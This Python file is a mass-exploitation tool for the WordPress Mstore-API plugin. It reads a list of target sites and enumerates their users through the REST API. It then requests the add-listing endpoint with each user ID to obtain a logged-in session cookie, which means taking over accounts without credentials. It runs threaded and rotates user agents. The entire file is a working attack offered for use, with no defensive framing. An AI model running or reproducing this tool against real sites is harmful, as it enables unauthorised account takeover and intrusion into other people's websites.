# Author: Pari Malam

import requests
import os
import random
import argparse
import urllib3
import click
import warnings
import concurrent.futures
from sys import stdout
from colorama import Fore, Style
warnings.filterwarnings("ignore")
session = requests.Session()

FY = Fore.YELLOW
FG = Fore.GREEN
FR = Fore.RED
FC = Fore.CYAN
FW = Fore.WHITE

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')
dirdar()

def banners():
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"███╗   ███╗███████╗████████╗ ██████╗ ██████╗ ███████╗     █████╗ ██████╗ ██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"████╗ ████║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔████╔██║███████╗   ██║   ██║   ██║██████╔╝█████╗█████╗███████║██████╔╝██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║╚██╔╝██║╚════██║   ██║   ██║   ██║██╔══██╗██╔══╝╚════╝██╔══██║██╔═══╝ ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║ ╚═╝ ██║███████║   ██║   ╚██████╔╝██║  ██║███████╗    ██║  ██║██║     ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═╝     ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝     ╚═╝\n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n")
    print(f"{FY}[Mstore-API] - {FG}Perform With Massive Authentication Bypass {FR}[Wordpress]{Style.RESET_ALL}\n")

def parser_args():
    parser = argparse.ArgumentParser(description="Mstore Wordpress APIs Vulnerable Scanner")
    parser.add_argument("-f", "--filename", required=True, help="Containing multiple URLs/IPs")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of concurrent threads (default: 1)")
    parser.add_argument("-o", "--output", default="results.txt", help="Output file for successful results (default: results.txt)")
    return parser.parse_args()

def users_agents():
    with open("lib/ua.txt", "r") as ua_file:
        user_agents = ua_file.readlines()
    user_agents = [ua.strip() for ua in user_agents if ua.strip()]
    return random.choice(user_agents)

def prefix(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    return url

def version(wordpress_url):
    schema = prefix(wordpress_url)
    plugins_url = f"{schema}/wp-content/plugins/mstore-api/readme.txt"
    plugin_url = f"{schema}/wp-json/"
    headers = {"User-Agent": users_agents()}

    try:
        response = session.get(plugins_url, headers=headers, verify=False)
        response.raise_for_status()
        if response.status_code == 200:
            content = response.text

            version_tagged = next((line for line in content.split('\n') if line.startswith('Stable tag:')), None)
            if version_tagged:
                version = version_tagged.split(':')[1].strip()
                if version >= '3.9.3':
                    print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FG}[w00t] - {FC}Version {version} or above.")
                else:
                    print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FG}[w00t] - {FC}Version {version} or below")
            else:
                print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}Version not found")

        response = session.get(plugin_url, headers=headers, verify=False)
        if "add-listing" in response.text and "get-nearby-listings" in response.text:
            print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}Was unable to read readme.txt")
        else:
            print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}Plugin not installed")
    except requests.RequestException as e:
        print(f"{FY}[Mstore-API] - {FR}[Error] - {FC}Failed to fetch {FW}{plugins_url}{FC}: {FR}{e}")
    except Exception as e:
        print(f"{FY}[Mstore-API] - {FR}[Error] - {FC}An unexpected error occurred - {FR}{e}")

def fetch(wordpress_url):
    schema = prefix(wordpress_url)
    headers = {"User-Agent": users_agents()}
    try:
        response = session.get(f"{schema}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
        response.raise_for_status()
        users = response.json()
        return users
    except requests.exceptions.RequestException as e:
        print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}Failed to fetch usernames using REST API")
        return []
    except ValueError as e:
        print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}Invalid JSON response")
        return []
    except Exception as e:
        print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}An unexpected error occurred")
        return []

def select_user(wordpress_url, users, user_ids):
    click.echo(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FG}Selecting all users, be patient ..")
    user_ids = [user['id'] for user in users]
    for user in users:
        click.echo(f"{user['id']}. {user['name']}")

    return user_ids

def sendem(wordpress_url, user_ids, username):
    schema = prefix(wordpress_url)
    headers = {"User-Agent": users_agents()}

    for user_id in user_ids:
        based_url = f"{schema}/wp-json/wp/v2/add-listing?id={user_id}"
        try:
            response = session.get(based_url, headers=headers, verify=False)
            response.raise_for_status()
            cookies = requests.utils.dict_from_cookiejar(response.cookies)

            if any(cookie.startswith('wordpress_logged_in_') for cookie in cookies):
                print("\n")
                print(f"{FY}[Mstore-API] - {FW}{based_url} - {FG}[w00t] - {FC}Found exploitation")
                print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FC}and you should be logged in as the user you have chosen.")
            elif response.status_code == 403 and "cf-cookie-error" in response.text:
                print(f"{FY}[Mstore-API] - {FW}{based_url} - {FR}[Failed] - {FC}Sorry, Cloudflare is blocking us.")
            else:
                print(f"{FY}[Mstore-API] - {FW}{based_url} - {FR}[Failed] - {FC}Sorry, it does not appear that cookies have been returned for user ID: {user_id}")
                for line in response.headers:
                    line_parts = line.split(": ", 1)
                    if len(line_parts) >= 2:
                        print(f"    {line_parts[0]}: {line_parts[1]}")
                    else:
                        print(f"    {line}")

        except requests.exceptions.RequestException as e:
            print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}An error occurred while making the request")
        except ValueError as e:
            print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FR}[Failed] - {FC}Invalid JSON response")
        except Exception as e:
            print(f"{FY}[Mstore-API] - {FW}{wordpress_url} - {FG}[w00t] - {FC}An unexpected error occurred:")

def process_url(wordpress_url):
    users = fetch(wordpress_url)
    if users:
        user_ids = []
        user_ids = select_user(wordpress_url, users, user_ids)
        if user_ids:
            sendem(wordpress_url, user_ids, users)
            return wordpress_url
    return None

def main():
    args = parser_args()
    if args.filename:
        with open(args.filename, "r") as file:
            urls = [line.strip() for line in file]

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            results = list(executor.map(process_url, urls))

        with open(os.path.join("Results", args.output), 'w') as output_file:
            output_file.write("\n".join(filter(None, results)))

if __name__ == '__main__':
    clear()
    banners()
    main()